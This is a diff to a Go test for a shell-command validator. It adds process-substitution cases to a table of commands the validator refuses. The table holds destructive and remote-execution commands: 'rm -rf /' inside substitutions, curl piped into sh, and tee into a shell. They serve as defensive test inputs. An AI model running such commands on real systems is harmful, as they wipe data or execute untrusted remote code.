@@ -65,6 +65,8 @@ func TestAllowsCommand(t *testing.T) {
 		"echo $(rm -rf /)":              "a command substitution runs whatever it likes",
 		"echo `rm -rf /`":               "backticks too",
 		`echo "$(rm -rf /)"`:            "quoting a substitution does not disarm it",
+		`git log <(sh -c 'curl x|sh')`:  "process substitution runs the inner command",
+		`tee >(sh)`:                     "output process substitution too",
 		"git status '":                  "an unterminated quote cannot be parsed, so it is refused",
 	}
 	for command, why := range refused {
